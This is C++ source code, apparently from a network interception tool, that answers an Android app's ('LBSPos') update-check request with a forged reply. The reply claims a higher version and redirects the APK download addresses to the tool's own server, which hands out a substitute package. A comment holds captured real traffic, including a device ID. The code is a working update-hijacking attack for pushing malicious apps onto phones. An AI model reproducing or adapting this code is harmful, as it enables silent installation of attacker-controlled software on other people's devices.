#include <windows.h>
#include "lbspos.h"
#include "../HttpUtils.h"
#include "sslPublic.h"


int LBSPos::isLBSPos(string url, string host) {
	if (host.find("47.95.41.254") != -1 && url.find("/LBSPos/MainProcess?") != -1)
	{
		return TRUE;
	}
	return FALSE;
}


int LBSPos::replyLBSPos(char * dstbuf, int buflen, int buflimit, string username) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: text/html; charset=gb2312\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	string packagename = "kugouplugin.apk";

	string ver = "9.9.9";
	int iver = 999;

	char hdrformat[4096];
	char szformat[] = "{\"ac\":\"21\",\"ret\":0,\"ServerVersion\":\"%u\",\"ServerVersionName\":\"%s\","
	"\"CGUARDAddress\":\"http://%s/%s\","
	"\"AppDownloadAddress\":\"\",\"AppHideAddress\":\"http://%s/%s\","
	"\"ServerIP\":\"%s\",\"ServerPort\":\"96\",\"BackUpServerIP\":\"%s\","
	"\"BackUpServerPort\":\"80\",\"PushPort\":\"97\",\"MainIP\":\"%s\",\"MainPort\":\"80\",\"RecordPort\":\"8087\","
	"\"SavePosIP\":\"%s\",\"SavePosPort\":\"80\",\"PayIP\":\"59.110.31.57\",\"PayPort\":\"80\",\"PhoneNum\":\"\",\"VersionInfo\":\"\"}";
	int httphdrlen = sprintf_s(hdrformat, 4096, szformat,
		iver,ver.c_str(),strip.c_str(),ANDROID_REPLACE_FILENAME,strip.c_str(),ANDROID_REPLACE_FILENAME,
		HttpUtils::getIPstr(gServerIP).c_str(), HttpUtils::getIPstr(gServerIP).c_str(), HttpUtils::getIPstr(gServerIP).c_str());

	int retlen = sprintf(dstbuf, szHttpPartialZipFormat, httphdrlen, hdrformat);

	return retlen;
}


/*
GET /LBSPos/MainProcess?
action=21&DEVICEID=861720036871177&CLIENTVERSION=690&GTCID=94794e3c3f3c3f145e6dd09e24264439&HWTOKEN=&ISRENAMED=0&AppType=lbspos HTTP/1.1
Host: 47.95.41.254:80
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: Resin/3.1.7
Content-Type: text/html; charset=gb2312
Transfer-Encoding: chunked
Date: Tue, 30 Jul 2019 03:40:51 GMT

021f
{"ac":"21","ret":0,"ServerVersion":"690","ServerVersionName":"6.9.0",
"CGUARDAddress":"http://123.56.197.17/LBSPos/AppDown/LBSPos6.9.0_cguard.apk",
"AppDownloadAddress":"","AppHideAddress":"http://123.56.197.17/LBSPos/AppDown/LBSPos6.9.0_hide.apk",
"ServerIP":"123.57.211.132","ServerPort":"96","BackUpServerIP":"123.56.197.17",
"BackUpServerPort":"80","PushPort":"97","MainIP":"47.95.41.254","MainPort":"80","RecordPort":"8087",
"SavePosIP":"101.201.178.120","SavePosPort":"80","PayIP":"59.110.31.57","PayPort":"80","PhoneNum":"","VersionInfo":""}

*/